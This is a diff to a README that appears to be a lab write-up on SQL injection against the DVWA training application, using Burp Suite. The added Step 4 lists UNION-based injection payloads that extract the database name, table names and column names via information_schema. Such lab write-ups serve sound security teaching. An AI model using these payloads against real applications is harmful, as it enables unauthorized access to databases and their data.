@@ -29,3 +29,16 @@
   Since I submited the value 1, I receive the respected query, within the id hold the value 1. By following the steps depicted within the picture, we have sent our log to the repeater tab in Burp. There will be able to forward and modify the request.
   <p align="center"><img width="500" height="360" alt="image" src="https://github.com/user-attachments/assets/c8a38567-f1d4-4523-b584-6219512e10a1" />
 </p>
+
+## Step 4
+  This is the part where we experiement with our SQL injection queries. Our purpose is to extract various information regarding the database, tables their columns and the data they hold. <br>
+
+  <div align="center">
+
+| Code | Data Extracted Description | SQL Query |
+| :-----------: | :----------: | :----------: |
+| 1 | Name of the database | `' UNION SELECT null, database() #` |
+| 2 | Based on the name of the database we get the tables | `' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='dvwa'` |
+| 3 | Based on each table we get the columns  | `' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='guestbook` |
+
+</div>
